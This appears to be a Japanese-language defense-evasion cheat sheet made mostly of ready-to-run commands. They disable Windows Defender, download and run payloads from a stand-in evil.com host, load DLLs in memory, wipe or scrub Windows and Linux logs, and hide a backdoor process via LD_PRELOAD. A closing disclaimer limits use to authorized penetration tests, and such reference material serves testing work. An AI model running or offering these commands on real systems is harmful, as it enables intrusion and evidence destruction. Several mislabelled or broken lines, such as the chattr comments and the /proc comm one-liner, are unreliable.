# Defense Evasion Techniques

## Windows 防御回避

### アンチウイルス回避
```powershell
# Windows Defender の無効化（管理者権限必要）
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true

# PowerShell 実行ポリシーのバイパス
powershell -ep bypass -nop -noexit -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"
```

### ログ削除
```powershell
# Windows イベントログのクリア
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# PowerShell ヒストリーの削除
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

### メモリ内実行
```powershell
# Reflective DLL インジェクション
$bytes = (New-Object Net.WebClient).DownloadData('http://evil.com/payload.dll')
[System.Reflection.Assembly]::Load($bytes)

# PowerShell クレデンシャル保護バイパス
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## Linux 防御回避

### ログ改ざん
```bash
# ログファイルの削除
rm -rf /var/log/*

# ログの選択的削除
grep -v "攻撃の痕跡" /var/log/auth.log > /tmp/clean_log && mv /tmp/clean_log /var/log/auth.log
```

### ファイルシステム隠蔽
```bash
# ファイル属性の変更
chattr +i file.txt  # 変更不可
chattr +s file.txt  # セキュアな削除
chattr +u file.txt  # アンデリート

# 隠しディレクトリの作成
mkdir "... "  # スペースで終わる名前
```

### プロセス隠蔽
```bash
# プロセス名の偽装
ps -ef | grep python | awk '{print $2}' | xargs -I % sh -c 'echo "#!/bin/bash\necho -n 1" > /proc/%/comm'

# プロセスの隠蔽（libprocesshider）
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
LD_PRELOAD=/path/to/libprocesshider.so python backdoor.py
```

## 注意事項
- これらの技術は、許可された環境でのペネトレーションテストでのみ使用してください
- システムのセキュリティ機能を無効化する可能性があります
- 実環境での使用は違法となる可能性があります 